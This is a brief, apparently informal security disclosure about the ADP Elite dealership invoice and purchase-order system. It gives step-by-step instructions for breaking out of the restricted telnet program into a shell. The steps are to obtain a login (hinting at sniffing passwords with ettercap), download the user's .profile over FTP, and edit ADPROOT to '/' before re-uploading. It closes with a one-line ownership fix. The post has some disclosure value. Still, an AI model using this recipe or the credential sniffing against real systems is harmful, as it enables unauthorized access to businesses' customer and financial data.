Adp Elite system is an invoice/purchase order suite very common in car dealerships.  It's a telnet based system.  When a user logs in via telnet, adp dumps the user into the program where the user can check on a vehicle's status, generate PO's and RO's, etc....  The program is rather large and runs on a linux based system.  Usually ftp is running as well.  A user with a valid login name/pass...  eh...cough...ettercap...cough is able to upload/download things into/from their directory... usually something like /adp/home/<user>....  by default there is a .profile containing this little gem... 

# ADPROOT is equivalent to REALROOT on CoRA systems
ADPROOT=${ADPROOT:="/adp"}
export ADPROOT

download it... modify it to 

# ADPROOT is equivalent to REALROOT on CoRA systems
ADPROOT=${ADPROOT:="/"}
export ADPROOT

then upload it...

now login via telnet... and bingo now you have a $hell

fix: chown root:root .profile
